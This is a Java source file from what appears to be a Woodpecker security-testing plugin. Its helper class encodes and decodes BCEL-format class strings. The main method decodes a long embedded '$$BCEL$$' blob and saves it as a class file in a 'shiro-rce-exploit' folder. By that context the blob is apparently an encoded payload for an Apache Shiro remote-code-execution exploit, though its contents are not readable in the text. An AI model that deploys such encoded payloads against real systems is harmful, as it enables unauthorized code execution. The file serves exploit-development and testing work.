package me.gv7.woodpecker.plugin.util;

import com.sun.org.apache.bcel.internal.classfile.Utility;
import java.io.*;

public class BcelUtil {
    public static void decode(String strBCEL,String classSavePath) throws Exception{
        strBCEL = strBCEL.replace("$$BCEL$$","");
        byte[] decodeStr = Utility.decode(strBCEL,true);
        FileOutputStream fos = new FileOutputStream(new File(classSavePath));
        fos.write(decodeStr);
        fos.flush();
    }

    public static String encode(String classFilePath) throws Exception{
        byte[] byteCode = getFileBytes(classFilePath);
        return "$$BCEL$$" + Utility.encode(byteCode,true);
    }

    public static String readFileContent(String fileName) throws Exception {
        File file = new File(fileName);
        BufferedReader reader = null;
        StringBuffer sbf = new StringBuffer();
        reader = new BufferedReader(new FileReader(file));
        String tempStr;
        while ((tempStr = reader.readLine()) != null) {
            sbf.append(tempStr);
        }
        reader.close();
        return sbf.toString();
    }

    public static byte[] getFileBytes(String file) throws Exception {
        File f = new File(file);
        int length = (int) f.length();
        byte[] data = new byte[length];
        new FileInputStream(f).read(data);
        return data;
    }

    public static void main(String[] args) throws Exception {
        String bcel_string="$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$d5Z$5bo$dc$c6$V$7e$d7$af$60$89$o$e0$c6$xZ$$P$m$85k$a0$8a$$$89$e0k$bd$SP$40$Q$8a$Ry$b8$cb$98$e4$d0$c3YY$db$40$40$M$E$b6$a3VMP$b8i$9b$GhR$a4A$h8q$db$87$c4vZ$f4$cfh$d7$ceS$feB$cf$cc$90$cb$fbE$8a$fa$d0$Bl$f12sns$cew$ce$99eH$ac$5bd$I$geC$93$84$c4$g$81$c9$c0$a7$i$$$$$y$b8$7eH$Z$d7$de$m$7bd$df$8c$80$edy$c0$cd$97$_V$3f$lq$k$9a$x$94$der$a1i$c6$eb$f8$df$40$3d$b8$J$b7$c7$Q$f1$ce$b3$a3$90$GQ$9e$b8$e9Rs$e3$fa$da$be$F$nwi$90$7f$e7$91$60$88$ca8$kX$dc$bc$K$7cD$ed$fc$841w$3dskkc$Vu$N$c7$bb$9eki$96G$a2H$db$i1$m$f6$80$T$eeZ$97ar$V$fcu$d7$e3$c04$5c$ed$81$P$B$8f$b4$f8$c9$9b$L$g$8e$90$b9$7b$84$83$W$c9$r$da$8037$Yj$8e$9cr$8d$f8$ut$d5$y$a5$d8$K$N8$ecs$z$ca$df$5e$d2$82$b1$e7$a9$85$f1$C$c5K$M7x$D$952z$ea$f5$c1B$9e$fc$q$b0F$8c$G$ee$_$c0N$96$eeQ$d7$9e$afJ$e9$a4$S$o$3f$7deD$Y$b1$f0$c1Z$60Q$h5P$3a$$$ea$da9m0$898$f8f$40$C$ba$e9$fa$90$b0$W$83$b3IF4$v$9ec$U$b5Q$ea$f4$K$T$a5rE$bd$87$c0$f3$a6$c92S$fa$e6$99iEn$df$ab$e7$b6$o7$d8B6$f2$cat$a8T$df$d03$B$60$RN$3c7$m$a6E$Z$98$e8$G$81M$98$j$T$d7$L$c2$88q$7dW$YV$d8$3a$3b3$b7$85$d9q$fe$fc$f4$c1$t$b3$f7$3f$9f$fd$fe$f1$f4$bdO$a7_$fds$f6$e1$3b$_$k$ffe$fa$de$d1$f4$f3$df$3d$ff$e0m$b5$x$df$fe$ebW$f8$7c$fa$e0$P$c7O$8e$a6$f7$8ef_$7d$3d$3d$fc$a8D$ab$ac$bd$89$f6S$hw$T$86n$c4$Z$R$a1a$a4$5b$ddk$da$N$r$df7w$8f$a6$bf$be7$bd$ffl$f6$d1$fd$e9$fd$7b$c7O$O$8f$9f$fcr$f6$fe$fd$e9$e3$a7$_$fe$f1q$e5$o4$a4f$5c$y$99$m$b6A$j$x1$ca$c1$ba$ee$82gk$96$a2$a1n$$ie$z$e5$O$g$3dq$b9$K$Y$b9$Ml9$d9$d0$ad$fa$bdJF$96$3a$82$O_$b6$y$88$ow$d7$D$83$b314$ac$8cw$9b$a2L9$o$uFa$x$g$88$88$7d$a3$Y$91$c2$60$WP$a7$80$GM$f6$S$a3$U4Fq$3d$ad$e7$7d$a0$81$X$81$U$c12$ddh$Z$d5$k$G$E5_g$d47h$c6$b4$bdV9J$$$df$c4$b7$f2M$f5S$e9$d7$F$e2$Na$9d$8c$f3$e7$8f$ff$f3$c5$ec$e1$d3$e7$87_$ce$de$ba$8b$n$f4$e2$d3$bb$Y$3f$cf$df$feR$c5$P$5e$l$3f$bbwbW$U$u$K$89$pV$n$85L$rW$5c$H$ac$89$e5$c1$ab$q$c2w$S_$ca$be$vi5yf$ca$ecd$7e$99_W$b4$5e$bfR$ee$b9$c8$o$d9$n$d6m$$$df$dc$dc$b8$f6$da$cfo$dc$5c$bb$d1$c0J$m$d8$l$a7_$3f$3b$7e$f2$d6$f1$93$cf$5e$dc$ffl$fa$c5$H$c7O$dfA$ecR$c8$f3$cd$df$k$d5$ae$8d$T$a7$c2$p$81$91p$a76$e1$W$91$3f$_$83$daR$a7$p$c7$y$g$9a$ab$93$80$f8$98$X$9d$d2$ab2$d2$Q$db$8e$a5I1$b4$l$afl$90$afLZl$cbF$e0$f2$h$98f$7d$Q$Eu$883$ad$de$d7$f41w$W_ir$8cj$8a$cb$o$df$P$c6$a1$a8k$c06$i$82$b1$7d2$o$a8$e0U$S$86$o$e1S$b6$c5$bc$h$84$e3$94$m2$d2$wi$z$Y$fb$D$ac$ca$a8c$ac$baQH8z$R$db$9c$84$60$de$5c$fb$e9$d6$da$60$b3$87$W$R$9c$fbr$3fU$B$b4$bd$f3$a6$7e$fee$fd$a0q$TU$a4$ce$ee$fey$fa$c9Q$$$5e$3f$3c$9a$k$7e$yr$df$bb$8f$9f$3f$fck$p$90f$c2$b3$DF$88qV$b1$b2$b6$da$a0$5c5$b2e$84$3e$v$ba$c5$W$7b$f8$a7$d9o$l$a8$7dl$9c$aaj$dex$c7Qh$c6$e3$t$d5$YVU$ed$a4$u$a6$96$gz$86Z$93$af$8aQb$7c2$3c$ab$s$e1$G$7b$f4$W$94wL$da$ae$99X$5c$fbYVme$96$j$e5$b2$b6j$uj$f5$b5$q$a7$3e$gX$F$91$N$91$c5$dc$90Sf$de$81$5dS$81$KF$5e$9b$j$P4K$E$9cf$mL$d2$3b$oQk$d0$e6$sb$80$89$zA$c0$d1z$d6$adM$ac$ec$a1$JN$r$a3$c6$b7$b2$5e$Q$eavsT1$ba$d9P$8c6$3b$ce$bd$d4$86$d0$a3$93$ee$c6$93z$9d$d2$80b$9c$d8$88$92$e1w03$e6$b5$c3C$e5$f7$b3w$7f3$7d$f0$f7$e7$8f$k$89$3c$fb$ef$a3$$$c1$ee$8b$aa4$l$af$81$3d7V$d4f$zU$dbn$ef$c4$81$t$96$88$e22y$dc$d3$fc$9a$A$ecJ$97$fb$e1z$96$b4$c8$W$f1$cb$94$a5$e9A0$e4$a3$9df$9a$b8$x$f8$cf$86$7d$qs$a1$FFDs$o$e7$e3$dc$a5$8b$f8$e7$c7Z$89$j$3e$3ew$ae$8b$5bd$g$80$94$c8$b6$db$o$ae$Yrw$ac$dc$fe$cc$bb5$e1$f2$5d$9c9$3e$5c$IT$d3n$a8$db$cc$c6$d0$O4D$u$L$C$s$dc$kc$d6$de$Y$G$88$fd$xX$b5f$db$c4$ae$R$92$db$d2$ed$a5$9d$e6$s$m$Zq$Tr$g$Wr$d3$cf$9d$db9$b9$fd$bfK$5c$9e$ad$P$e5$EG$82$F$N$5bt$a9$97$b4k$8f$95$7f$92$deu$81$caFH$3c$e8z$qU8$fe$aa8$f5$d1$b8$90$n$d2$e6$e7$7b$Z9$S$b8K$Z$d7$f5n$dcI$e7$c4$91$L$Z$ff$y$a7$u$R$a4$aa$n$v$f7p$99$a8US$o$5dU$bc2s$a1$f3$X$82$cfo$_y$U$j$8dG$db$c2$P$Mu$9b$83Z$91m$fbY$a4$y$b1$a9$f2M$de$ea$93$C$F$b8p6$a1$a1$cc$b8$3dS$9ch$Q$Xk$7f$5d$i$c0$ea$3d$ed$a5$97$b4$fa9B3Q$cf$e8$b5$60$c1$j$e1$dc$J$81$fa$T$h$ac$f0$f0a$j$feq$a7$7b$e9$I$C$97q$818$8e$91$8c$ebh6$d6$sRn$a0$cdBC$60$87$U$cd$5e$t$f6$3c$98$ae$d1$c1$d8$g$c9U$a93$c3$7e$TPt$S$80$8f$dc$e8$fbK$b5$ec$cf$d4$96P$97X$ce$c0$90$p$ac$r$3c$60$a7$b4c$a3$Z$5b$x$d0j$B$b1$a1$Gf$9dV$e0$OB$b7$W$a0$dd$e4$3a$D9$ff$cf$7dg$e8$d1$5d$e2$fd$_$5c$e74$8e$d1$o$cd$d9$5b$b5$f6$f4$b4$qy$J$bd$b3$ed$V$9dP$Of$fc$93$dck$8c$8e$c3$8d$c0$a1$f5$b8$5eo$a0$82ABF$85$5e$945$f6$k$t1$81$Y$e9$c9$d42cdr$c5$8d$b8$WF$b2W$a9x$d5k$f5C1$d2$q$9adQ$91F$91$aa$Za$dd$825$O$3eh$_$ee$a4QBU5$Y$ae$dbk$b6$O$83$dbm5$ffIM$pF$d6K2$b2$d4$J$93$a9j$ae$a1$h$60I$83fP$c5O$_$vB$w$a8$f5$b5$L$9d$da$3e$cd$f1$c8$b0$c9U2$fc_$c7$e2$H$f1$aa$l$b79$F$n$80$f6$b5$b8$e8X$bc$82$a5$de$98$M$a1$b5$a7u$jC$K$90$i$b0$b5$X$e7$M$f8$98$F$a5$dfT$ba$c8$9f_$a2g$q$3f$f5$d9K$j$40$9fYM$9f$ce$8c$VO$P$c7$90$cb$82b$f4$93$eb$7b$c0$98k$83$w$ec$d5$cf$e5$f1$cf$ca$$7T$f3$82j$3bn$f2$c3$b7$ba$99W$f1$b1e$8a$c5$fcAL$3fK$d1$a6$f1$81$7b$feK$81$e4$60$3e$be$edk$85O$D$d2$f7$ea$be$l$9f$fc$af$8c$Q$ef$S$a1$c4$f5$5c$a6$cc$b7$D$fd$3a$B$c5$u$7f$b5$80$a6R$7f$Rq$cao$7b$FQ$_VS$8a$c5f$c9E$91$96z$dc$x$ea$95R$T8$l$Lb$ce$83$c7$d0W$E$a6$_$K$ld$d4$bb$80E$7c$ec$fa$a2$98$ef0$dd$94$N$f6u$c7$d0$7d$b2$bf$88$nv$J$a1$Rp$fbcR$8b$X$8a$mX$9d$c6$eb$93$7b$e1$9co$L$V$5c$b6$84$cd$H$97$f5$5e$f6tDE$P$c2A$d9$c6$K$g$faU$W$z$a0$86$ea$9fX$e25$89$b9$x$Cr$k$vR$40$c4$c2u$3a$O$ba$d4$L$cduL$d2$ac$s$a7$ef$92$fa$V$w$ac_$dfb$da$e0$b8$B$c8$a9$F8$eck$bb$T$O$db$3b$c9$dd$i$ac$b3$b8$5d$8f6$fe$v$ce$e2$e7$l$db$E$e1$Y$h$7flQ$7d$e4$95$5e_$ca$faUfR$d3aiB$f3UTF$a6$ea$ebc$9eR$dc$ad$7c$aa$O$M$hW6$b1$U$d9$3d$90$c9$bdv$ca$9d$91$8b$f8h$YbZFCSt$e5F$_$f1$ffF$u$af$U$dd$bc$c3$5c$8e$be$d8b$90$7d$d3b$Tl$a9$cd$V7$i$B$d3$y$f5$e7R$d5Kek$f5$F$81$a1$af$ae$N$g$bfwPK$qX$ff$a0$9f$t7$A$L$91$ff2L$d6$89$85$dd$fc$a4$820$3e$K$80$R$Oj$ae$91l$c3$9cF$U$82e$e2T$a42$c0KC$df$fd$e1$Sq$96$7e$f4$8a$$$a8$89$9d$92$df$T4H$a8$9cZ$b3m$oP5$96W$a4$82$80xF$b5M9$9d$bb$80$d1D$da$cf$fdv$94$i$ee$8c$Z$83$m$3e$c7Q$J$3dN$db$99$f84$b0$ca$c9$e3S_J$d8$d7$96$d4E$7c$c8$d2$c0$3c$c1$h$f1$3b$ab$fa$40NZ$_$be$d4$7f$b6$b8E$Q$7c$fd$90p$R$89H_$7c$92f2$ec$dc$a8$_$$Q4NU$fc$h$b5$G$9c$pW$97$W$b3$ea80_$3bTP$x$S$cb$d6$X$VG$b9$99tk$ce$f3y1$81$X$S$5b$d51bK$f1a$p$jFq$f7$db$be$8e$x$90$60X$e7Z$ilE$c5$R$3e$s$8b$fc$a42HK$a5z$ba$H$L$ff$F$c9$_$$$g$3e$v$A$A";
        String save_class_path="/Users/c0ny1/Documents/codebak/shiro-rce-exploit/n.class";

        decode(bcel_string,save_class_path);
    }
}

